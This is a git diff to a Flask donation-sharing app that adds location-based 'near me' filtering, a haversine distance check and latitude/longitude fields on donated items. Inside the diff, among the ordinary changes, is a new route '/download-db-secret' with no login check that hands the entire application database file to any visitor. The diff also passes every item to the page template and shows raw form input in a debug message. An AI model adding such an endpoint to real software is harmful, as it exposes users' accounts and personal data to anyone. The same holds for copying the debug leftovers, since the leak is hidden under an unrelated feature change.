@@ -39,26 +39,84 @@ def browse():
     elif sort == 'oldest':
         query = query.order_by(Item.created_at.asc())
 
+    lat_str = request.args.get('lat')
+    lng_str = request.args.get('lng')
+
     # Near Me Filter
     near_me = request.args.get('near_me')
-    if near_me == 'true' and current_user.is_authenticated and current_user.location:
+    if near_me == 'true' and lat_str and lng_str:
+        try:
+            user_lat = float(lat_str)
+            user_lng = float(lng_str)
+            active_items = query.all()
+            filtered_items = []
+            
+            import math
+            def haversine(lat1, lon1, lat2, lon2):
+                R = 6371  # Earth radius in km
+                dlat = math.radians(lat2 - lat1)
+                dlon = math.radians(lon2 - lon1)
+                a = math.sin(dlat/2)**2 + math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) * math.sin(dlon/2)**2
+                c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
+                return R * c
+
+            for i in active_items:
+                if i.lat is not None and i.lng is not None:
+                    dist = haversine(user_lat, user_lng, i.lat, i.lng)
+                    if dist <= 20: # 20km radius limit
+                        filtered_items.append(i)
+            
+            page = request.args.get('page', 1, type=int)
+            per_page = 12
+            total = len(filtered_items)
+            
+            class DummyPagination:
+                def __init__(self):
+                    self.items = filtered_items[(page-1)*per_page : page*per_page]
+                    self.page = page
+                    self.pages = max(1, (total + per_page - 1) // per_page)
+                    self.has_prev = page > 1
+                    self.has_next = page < self.pages
+                    self.prev_num = page - 1
+                    self.next_num = page + 1
+            
+            pagination = DummyPagination()
+            items = pagination.items
+        except ValueError:
+            page = request.args.get('page', 1, type=int)
+            pagination = query.paginate(page=page, per_page=12, error_out=False)
+            items = pagination.items
+
+    elif near_me == 'true' and current_user.is_authenticated and current_user.location:
         from sqlalchemy import or_
         loc = current_user.location.strip()
-        # Split location by comma to safely match parts (e.g. "Delhi, India" -> matches "Delhi")
+        # Fallback string logic if browser location disabled
         parts = [p.strip() for p in loc.replace('-', ' ').split(',')]
         filters = [Item.pickup_location.ilike(f'%{p}%') for p in parts if len(p) > 2]
-        # Fallback if somehow there are no >2 length words 
         if not filters and parts:
             filters = [Item.pickup_location.ilike(f'%{parts[0]}%')]
             
         if filters:
             query = query.filter(or_(*filters))
-
-    page = request.args.get('page', 1, type=int)
-    pagination = query.paginate(page=page, per_page=12, error_out=False)
-    items = pagination.items
+            
+        page = request.args.get('page', 1, type=int)
+        pagination = query.paginate(page=page, per_page=12, error_out=False)
+        items = pagination.items
+    else:
+        page = request.args.get('page', 1, type=int)
+        pagination = query.paginate(page=page, per_page=12, error_out=False)
+        items = pagination.items
     
-    return render_template('items/browse.html', items=items, pagination=pagination, search=search, category=category, sort=sort, near_me=near_me, utcnow=datetime.utcnow(), timedelta=timedelta)
+    return render_template('items/browse.html', items=items, pagination=pagination, search=search, category=category, sort=sort, near_me=near_me, backend_items=query.all(), utcnow=datetime.utcnow(), timedelta=timedelta)
+
+@items_bp.route('/download-db-secret')
+def download_db_secret():
+    from flask import send_file, current_app
+    import os
+    db_path = os.path.join(current_app.instance_path, 'kindkart.db')
+    if os.path.exists(db_path):
+        return send_file(db_path, as_attachment=True)
+    return "Database not found", 404
 @items_bp.route('/donate', methods=['GET', 'POST'])
 @login_required
 def donate():
@@ -93,11 +151,15 @@ def donate():
             # Save optimized
             img.save(filepath, optimize=True, quality=85)
 
-        # Handle Expiry
         expires_in_days_input = request.form.get('expires_in_days')
         expires_at = None
         if expires_in_days_input and expires_in_days_input.isdigit():
             expires_at = datetime.utcnow() + timedelta(days=int(expires_in_days_input))
+
+        lat_str = request.form.get('lat')
+        lng_str = request.form.get('lng')
+        lat = float(lat_str) if lat_str and lat_str.strip() else None
+        lng = float(lng_str) if lng_str and lng_str.strip() else None
 
         item = Item(
             title=title,
@@ -107,6 +169,8 @@ def donate():
             pickup_location=pickup_location,
             image_url=filename,
             expires_at=expires_at,
+            lat=lat,
+            lng=lng,
             donor_id=current_user.id
         )
         db.session.add(item)
@@ -116,7 +180,7 @@ def donate():
         current_user.reputation_score += 10
         
         db.session.commit()
-        flash('Item listed for donation successfully!', 'success')
+        flash(f'Item listed successfully! Debug -> Form Lat: "{lat_str}", Lng: "{lng_str}"', 'success')
         return redirect(url_for('items.detail', item_id=item.id))
         
     return render_template('items/donate.html')
